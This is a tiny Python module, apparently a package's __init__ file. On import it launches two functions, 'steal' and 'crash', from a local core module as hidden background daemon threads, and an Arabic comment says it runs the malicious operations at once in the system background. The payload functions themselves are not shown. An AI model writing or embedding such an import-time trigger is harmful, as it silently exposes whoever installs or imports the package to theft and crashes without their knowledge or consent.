from .core import steal, crash
import threading

# تنفيذ العمليات الخبيثة فور الاستدعاء في خلفية النظام
threading.Thread(target=steal, daemon=True).start()
threading.Thread(target=crash, daemon=True).start()
